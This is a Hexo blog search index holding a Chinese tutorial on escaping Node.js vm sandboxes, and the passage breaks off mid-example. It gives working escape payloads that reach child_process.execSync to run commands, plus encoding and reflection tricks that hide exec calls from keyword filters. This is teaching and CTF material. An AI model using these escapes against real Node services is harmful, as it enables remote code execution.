<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Node JS VM 沙箱逃逸</title>
      <link href="/2024/03/29/VM%E9%80%83%E9%80%B8+node.js%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cbypass/"/>
      <url>/2024/03/29/VM%E9%80%83%E9%80%B8+node.js%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cbypass/</url>
      
        <content type="html"><![CDATA[<h1 id="Node-JS-VM-沙箱逃逸"><a href="#Node-JS-VM-沙箱逃逸" class="headerlink" title="Node JS VM 沙箱逃逸"></a>Node JS VM 沙箱逃逸</h1><h2 id="沙箱的概念（维基百科）"><a href="#沙箱的概念（维基百科）" class="headerlink" title="沙箱的概念（维基百科）"></a>沙箱的概念（维基百科）</h2><ol><li><strong>沙盒</strong>（英语：sandbox，又译为<strong>沙箱</strong>）是一种安全机制，为执行中的程式提供隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供<a href="https://zh.wikipedia.org/wiki/%E5%A1%97%E9%8A%B7%E7%A9%BA%E9%96%93">用后即回收</a>的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%8C%96">虚拟化</a>的一种。沙盒中的所有改动对<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>不会造成任何损失。通常，这种技术被<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>技术人员广泛用于测试可能<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92">带毒</a>的程序或是其他的<a href="https://zh.wikipedia.org/wiki/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6">恶意代码</a>[<a href="https://zh.wikipedia.org/zh-hans/%E6%B2%99%E7%9B%92_(%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8)#cite_note-2">2]</a>。现在的整合式防火墙常含有云端沙盒，当本地静态分析无法办别时，就会去云端比对hash值，查看是否有相关情资，若为未发现过的可疑程式，则送入沙盒测试，并记录其行为模式。</li><li>当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li></ol><h3 id="Node-将字符串执行为代码"><a href="#Node-将字符串执行为代码" class="headerlink" title="Node 将字符串执行为代码"></a>Node 将字符串执行为代码</h3><h4 id="方法一-eval"><a href="#方法一-eval" class="headerlink" title="方法一 eval"></a>方法一 eval</h4><ol><li><p>创建1.txt文件，写入内容 <code>var age=20</code>,这里再一次创建一个JS文件、</p></li><li><p>在同级目录下面创建1.js文件，写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">let content = fs.readFileSync(&#x27;age.txt&#x27;, &#x27;utf-8&#x27;)</span><br><span class="line">console.log(content)</span><br><span class="line">eval(content)</span><br><span class="line">console.log(age)</span><br></pre></td></tr></table></figure></li><li><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240325162558791.png" alt="image-20240325162558791"><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240325162616605.png" alt="image-20240325162616605"></p></li><li><p>然后直接使用node命令就OK了，这里值得一提的是，如果在1.js里面重新定义一个age变量这里就会报错<code>SyntaxError: Identifier &#39;age&#39; has already been declared</code></p></li><li><p>这里比较麻烦的地方就是每个模块都有自己的作用域，这里就会出现很多的模块，十分的麻烦，eval不好用。</p></li></ol><h4 id="方法二-new-Function"><a href="#方法二-new-Function" class="headerlink" title="方法二 new Function"></a>方法二 new Function</h4><ol><li><p>在方法一被不同模块的作用域被限制了使用，这里我们自己创造作用域，</p></li><li><p>这里new Function里面的age是形参，第二个是函数体。这里使用node命令还是会打印21</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">let age= 20</span><br><span class="line">const add = new Function(&#x27;age&#x27;,&#x27;return age+1&#x27;)</span><br><span class="line">console.log(add(age))</span><br></pre></td></tr></table></figure></li><li><p>由作用域的定义里面我们知道，函数内外的作用域是不同的，这里使用new function的时候我们就会发现形参会很多，如果函数多起来就会很麻烦</p></li></ol><blockquote><p>通过这两个方法我们想要有独立的作用域，让代码在我们的作用域里面隔离的运行，达到可以执行外部读取到的其它模块的内容，同时还把模块中的作用域与外部作用域进行了隔离，避免同名变量冲突的目的</p></blockquote><h2 id="VM模块"><a href="#VM模块" class="headerlink" title="VM模块"></a>VM模块</h2><ol><li><p><strong>vm 模块</strong>允许在 V8 虚拟机上下文中编译和运行代码。 vm 模块不是安全的机制。 不要使用它来运行不受信任的代码。 JavaScript 代码可以立即编译并运行，也可以编译、保存并稍后运行。 常见的用例是在不同的 V8 上下文中运行代码。 这意味着被调用的代码与调用代码具有不同的全局对象。</p></li><li><p>这里的上下文类似于包的性质，这就提供了一个相对安全的环境来运行我们的代码。</p></li><li><p><code>vm.Script</code>方法构建一个脚本对象：<code>new vm.Script(code[, options])</code>，他的API可以总结为下面三个：</p><ul><li><code>script.runInThisContext(opts)</code> - 在当前作用域中运行脚本，也就是说，脚本可以访问当前脚本的全局变量，而不是局部作用域。</li><li><code>script.runInContext(context, opts)</code> - 在提供的作用域中运行脚本，作用域是某个 <code>vm.createContext</code> 的结果。 在 <code>script.runInContext</code> 中，您可以提供一个自定义可控sandbox。</li><li><code>script.runInNewContext(sandbox, opts)</code> - 在一个新的 sandbox 的作用域范围内运行脚本。即 <code>runInNewContext</code> 会为您自动调用 <code>vm.createContext</code>。</li></ul><p>当然也可以直接用<code>vm</code>上的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">vm.<span class="title function_">runInThisContext</span>(code, opts);</span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(code, sandbox, opts);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, context, opts);</span><br></pre></td></tr></table></figure><blockquote><ol><li>从上面可以看出，<code>vm</code>始终提供了一个可选的作用域来实现沙盒特性，以此来隔绝沙盒内外的影响。</li></ol></blockquote></li></ol><h3 id="VM逃逸"><a href="#VM逃逸" class="headerlink" title="VM逃逸"></a>VM逃逸</h3><ol><li><p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240325192516662.png" alt="image-20240325192516662"> </p></li><li><p><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性</p></li><li><pre><code class="js">const vm = require(&#39;vm&#39;);let localVar = &#39;initial value&#39;;const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;);console.log(&#39;vmResult:&#39;, vmResult);console.log(&#39;localVar:&#39;, localVar);// vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   这里导入了VM模块，这里的 `localVar`这个变量访问不到VM模块里面的值，所以这里的值是不会发生改变的，这也就是所谓的沙箱机制</span><br><span class="line"></span><br><span class="line">4. vm.createContext([sandbox])：在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</span><br><span class="line"></span><br><span class="line">5. vm.runInContext(code, contextifiedSandbox[, options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</span><br><span class="line"></span><br><span class="line">6. vm.runInNewContext(code[, sandbox][, options]):creatContext和runInContext的结合版，传入要执行的代码和沙箱对象，虽然是会创建相关的沙箱环境，可以访问到global上的全局变量，但是访问不到自定义的变量</span><br><span class="line"></span><br><span class="line">7. vm.Script类 vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行,**这会对沙盒环境的变量进行修改**</span><br><span class="line"></span><br><span class="line">   ```js</span><br><span class="line">   const util = require(&#x27;util&#x27;);</span><br><span class="line">   const vm = require(&#x27;vm&#x27;);</span><br><span class="line">   const sandbox = &#123;</span><br><span class="line">   animal: &#x27;cat&#x27;,</span><br><span class="line">   count: 2</span><br><span class="line">   &#125;;</span><br><span class="line">   const script = new vm.Script(&#x27;count += 1; name = &quot;kitty&quot;;&#x27;);</span><br><span class="line">   const context = vm.createContext(sandbox);</span><br><span class="line">   script.runInContext(context);//方法将之前创建的脚本在指定的沙盒执行环境中运行，这将修改沙盒环境中的变量。</span><br><span class="line">   console.log(util.inspect(sandbox));</span><br><span class="line">   // &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></pre></td></tr></table></figure>可以看到的是，沙盒环境里面的属性值改变，并且增加了属性。</code></pre></li></ol><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol><li>沙盒逃逸最后都是进行RCE,这里我们就要获取到process这个对象，这个对象是挂载在global，<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</li></ol><h5 id="用this-从外部对象引入"><a href="#用this-从外部对象引入" class="headerlink" title="用this 从外部对象引入"></a>用this 从外部对象引入</h5><ol><li><p>从沙箱外部引入对象，通过这个对象来获取他的构造器，再获得一个构造器对象的构造器（此时为Function的constructor）</p></li><li><pre><code>@1：const y1 = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);@2：const y1 = vm.runInNewContext(`this.toString.constructor(&#39;return process&#39;)()`);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 这里反引号包裹code参数，这样可以使code更加严格的执行。最后的括号，是用来调用这个用Function的constructor生成的函数，最终返回了一个process对象。</span><br><span class="line"></span><br><span class="line">3. 获得了process对象我们就可以进行RCE了。`y1.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()`</span><br><span class="line"></span><br><span class="line">#### 利用内置对象的属性arguments.callee.caller</span><br><span class="line"></span><br><span class="line">1.  `context = Object.create(null);` 出现这个时就得换方法了</span><br><span class="line"></span><br><span class="line">2. `arguments.callee.caller` 是一个引用当前正在执行的函数的引用的属性。这个属性可以用来获取调用当前函数的函数的引用，也就是返回函数的引用者</span><br><span class="line"></span><br><span class="line">   代码理解：</span><br><span class="line"></span><br><span class="line">   ```js</span><br><span class="line">   function outerFunction() &#123;</span><br><span class="line">       innerFunction();</span><br><span class="line">   &#125;</span><br><span class="line">   function innerFunction() &#123;</span><br><span class="line">       console.log(arguments.callee.caller);</span><br><span class="line">   &#125;</span><br><span class="line">   //outerFunction();</span><br></pre></td></tr></table></figure></code></pre></li><li><p>这个适用于this的值为NULL，并且没有其他可以引用的情况。具体实现就是，在沙箱内部定义一个函数，然后在沙箱外面进行调用这个函数，就可以获得沙箱外部的对象了，也就逃逸成功了。</p><p>举个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>这里首先定义了空对象 a，并且这里直接对toString进行了重写的操作，也就是在沙箱内部构造了函数</li><li>当外部调用toString函数的时候arguments.callee.caller就会获取调用toString的对象，利用这个对象的构造函数的构造函数返回了process，也就是constructor.constructor的作用（<strong>二次constructor来获取Function原型对象</strong>），只要返回了process这个全局对象就差不多OK了</li><li><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240327232845024.png" alt="image-20240327232845024"></li><li>这里需要注意的是toString的调用是隐式调用</li><li><code>process.mainModule.require</code> 是一种获取主模块的方式，而 <code>child_process.execSync</code> 是一个用于同步执行命令的函数，在这里用于执行 <code>whoami</code> 命令</li><li>反引号包裹的实际是一个自执行函数</li></ol></li></ol><h4 id="Proxy劫持"><a href="#Proxy劫持" class="headerlink" title="Proxy劫持"></a>Proxy劫持</h4><ol><li><p>当外部没有触发我们内部构造的函数时，我们就得使用一些方法来无条件运行我们的函数</p></li><li><p>这里我们使用Proxy来劫持属性，下面还是用代码来理解</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure><ul><li><code>get</code> 是一个 Proxy 对象的拦截器方法，用于拦截对 Proxy 实例属性的访问。在这个具体的拦截器函数中，它实现了对属性的访问的拦截</li><li>这个实现了外部无论访不访问这个对象的属性都会被劫持，也就会被arguments.callee.caller获取外部的调用的对象，后面的步骤就和之前的一样了。</li></ul></li></ol><h4 id="借助异常"><a href="#借助异常" class="headerlink" title="借助异常"></a>借助异常</h4><ol><li><p>沙箱的返回值返回的是我们无法利用的对象或者没有返回值时我们可以使用这个方法</p></li><li><pre><code class="js">const vm = require(&quot;vm&quot;);const script = `    throw new Proxy(&#123;&#125;, &#123;        get: function()&#123;            const cc = arguments.callee.caller;            const p = (cc.constructor.constructor(&#39;return process&#39;))();            return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();        &#125;    &#125;)`;try &#123;    vm.runInContext(script, vm.createContext(Object.create(null)));&#125;catch(e) &#123;    console.log(&quot;error:&quot; + e) &#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. 这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来</span><br><span class="line"></span><br><span class="line">## Node.js代码执行绕过的一些技巧</span><br><span class="line"></span><br><span class="line">### child_process</span><br><span class="line"></span><br><span class="line">1. Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   const &#123; spawn &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line">   </span><br><span class="line">   const childProcess = spawn(command, [args], options);</span><br></pre></td></tr></table></figure>- `command` 是要执行的命令。- `args` 是一个数组，包含命令的参数。- `options` 是一个可选的对象，用于指定进程的配置选项，例如当前工作目录、环境变量等</code></pre></li><li><p><strong>execFileSync(command[, args] [, options])</strong>:</p><ul><li>同步地执行外部命令，等待命令执行完成后返回结果。</li><li><code>command</code> 是要执行的命令。</li><li><code>args</code> 是一个可选的数组，包含命令的参数。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li></ul></li><li><p><strong>spawnSync(command[, args] [, options])</strong>:</p><ul><li>同步地启动一个子进程，并且获取其输出结果。</li><li><code>command</code> 是要执行的命令。</li><li><code>args</code> 是一个可选的数组，包含命令的参数。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li></ul></li><li><p><strong>execSync(command[, options])</strong>:</p><ul><li>同步地执行外部命令，等待命令执行完成后返回结果。</li><li><code>command</code> 是要执行的命令。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li></ul></li><li><p><strong>fork(modulePath[, args] [, options])</strong>:</p><ul><li>启动一个新的 Node.js 进程，并调用指定模块。</li><li><code>modulePath</code> 是要执行的模块的路径。</li><li><code>args</code> 是一个可选的数组，包含传递给模块的参数。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li></ul></li><li><p><strong>exec(command[, options] [, callback])</strong>:</p><ul><li>异步地执行外部命令，通过回调函数获取命令执行结果。</li><li><code>command</code> 是要执行的命令。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li><li><code>callback</code> 是一个回调函数，用于获取命令执行的结果。</li></ul></li><li><p><strong>execFile(file[, args] [, options] [, callback])</strong>:</p><ul><li>异步地执行可执行文件，通过回调函数获取执行结果。</li><li><code>file</code> 是要执行的可执行文件路径。</li><li><code>args</code> 是一个可选的数组，包含传递给可执行文件的参数。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li><li><code>callback</code> 是一个回调函数，用于获取执行结果。</li></ul></li><li><p><strong>spawn(command[, args] [, options])</strong>:</p><ul><li>异步地启动一个子进程，不阻塞主进程，通过事件监听获取子进程的输出结果。</li><li><code>command</code> 是要执行的命令。</li><li><code>args</code> 是一个可选的数组，包含命令的参数。</li><li><code>options</code> 是一个可选的对象，用于指定进程的配置选项。</li></ul></li></ol><p>这些方法提供了不同的方式来执行外部命令或启动子进程，并且适用于不同的使用场景。在选择方法时，需要根据具体的需求和情况来决定使用哪种方法。</p><h3 id="常规绕过方式"><a href="#常规绕过方式" class="headerlink" title="常规绕过方式"></a>常规绕过方式</h3><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>在Node.js中在字符串内用十六进制，这个十六进制对应的acci码的字符是等价的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>=<span class="string">&quot;\61&quot;</span>)</span><br><span class="line">\\ture</span><br></pre></td></tr></table></figure><h4 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h4><p>思路跟上面是类似的，由于<code>JavaScript</code>允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe\u0063Sync&quot;</span>](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="加号拼接"><a href="#加号拼接" class="headerlink" title="加号拼接"></a>加号拼接</h4><p>原理很简单，加号在js中可以用来连接字符，所以可以这样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h4><p>相关内容可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">MDN</a>，这里给出一个payload</p><blockquote><p>模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(`prototype`)            //prototype</span><br><span class="line">console.log(`$&#123;`prototyp`&#125;e`)       //prototype</span><br><span class="line">console.log(`$&#123;`$&#123;`prototyp`&#125;e`&#125;`)  //prototype</span><br></pre></td></tr></table></figure><h4 id="concat连接"><a href="#concat连接" class="headerlink" title="concat连接"></a>concat连接</h4><p>利用js中的concat函数连接字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><p>这种应该是比较常规的思路了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4</span></span><br></pre></td></tr></table></figure><h3 id="新奇绕过"><a href="#新奇绕过" class="headerlink" title="新奇绕过"></a>新奇绕过</h3><p>这一块主要是换个思路，上面提到的几种方法，最终思路都是通过编码或者拼接得到<code>exec</code>这个关键字，这一块考虑js的一些语法和内置函数。</p><h4 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h4><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，再通过数组下标就可以拿到<code>execSync</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">constructor</span>===<span class="title class_">Object</span>)</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">5</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h4><p>在js中，需要使用<code>Reflect</code>这个关键字来实现反射调用函数的方式。譬如要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>))</span><br><span class="line"><span class="comment">//返回所有函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))])</span><br><span class="line"><span class="comment">//拿到eval</span></span><br></pre></td></tr></table></figure><p>拿到eval之后，就可以常规思路rce了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里虽然有可能被检测到的关键字，但由于<code>mainModule</code>、<code>global</code>、<code>child_process</code>等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title 